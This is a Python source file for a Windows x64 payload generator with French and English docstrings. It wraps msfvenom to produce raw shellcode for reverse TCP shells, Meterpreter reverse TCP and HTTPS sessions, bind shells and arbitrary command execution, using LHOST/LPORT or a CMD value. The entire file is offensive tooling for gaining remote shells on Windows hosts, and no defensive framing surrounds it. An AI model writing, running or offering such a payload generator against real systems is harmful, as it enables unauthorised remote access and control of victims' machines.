#!/usr/bin/env python3
"""
Windows x64 Payload Generator
- Reverse TCP shells
- Meterpreter payloads
- Exec payloads
"""

import subprocess
import struct
import socket
from typing import Optional

class WindowsX64Payloads:
    """
    Générateur de payloads Windows x64
    """
    
    MSF_PAYLOADS = {
        'reverse_tcp': 'windows/x64/shell_reverse_tcp',
        'meterpreter': 'windows/x64/meterpreter/reverse_tcp',
        'meterpreter_https': 'windows/x64/meterpreter/reverse_https',
        'bind_tcp': 'windows/x64/shell_bind_tcp',
        'exec': 'windows/x64/exec',
    }
    
    def __init__(self, use_msf: bool = True):
        self.use_msf = use_msf
    
    def reverse_tcp(self, lhost: str, lport: int) -> bytes:
        """Reverse TCP shell"""
        if self.use_msf:
            return self._use_msfvenom('reverse_tcp', lhost, lport)
        return b""
    
    def meterpreter_reverse_tcp(self, lhost: str, lport: int) -> bytes:
        """Meterpreter reverse TCP"""
        if self.use_msf:
            return self._use_msfvenom('meterpreter', lhost, lport)
        return b""
    
    def exec(self, cmd: str) -> bytes:
        """Execute command"""
        if self.use_msf:
            return self._use_msfvenom_with_option('exec', 'CMD', cmd)
        return b""
    
    def _use_msfvenom(self, payload_key: str, lhost: str, lport: int) -> bytes:
        """Utilise msfvenom"""
        payload = self.MSF_PAYLOADS.get(payload_key, payload_key)
        cmd = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}', '-f', 'raw']
        
        try:
            result = subprocess.run(cmd, capture_output=True, check=True)
            return result.stdout
        except:
            return b""
    
    def _use_msfvenom_with_option(self, payload_key: str, option: str, value: str) -> bytes:
        """Utilise msfvenom avec option"""
        payload = self.MSF_PAYLOADS.get(payload_key, payload_key)
        cmd = ['msfvenom', '-p', payload, f'{option}={value}', '-f', 'raw']
        
        try:
            result = subprocess.run(cmd, capture_output=True, check=True)
            return result.stdout
        except:
            return b""
        